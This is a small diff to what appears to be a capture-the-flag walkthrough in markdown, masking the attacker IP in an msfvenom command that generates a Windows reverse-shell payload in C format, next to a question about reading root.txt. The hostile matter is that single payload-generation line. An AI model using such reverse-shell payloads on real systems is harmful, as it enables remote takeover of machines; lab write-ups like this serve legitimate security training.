@@ -237,7 +237,7 @@ This gives us shell now we can change these to work on the target.
 
 **After gaining access, what is the content of the root.txt file?**
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=7777 -b "\x00" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=7777 -b "\x00" -f c``
 
 - adjust our payload to suit
 
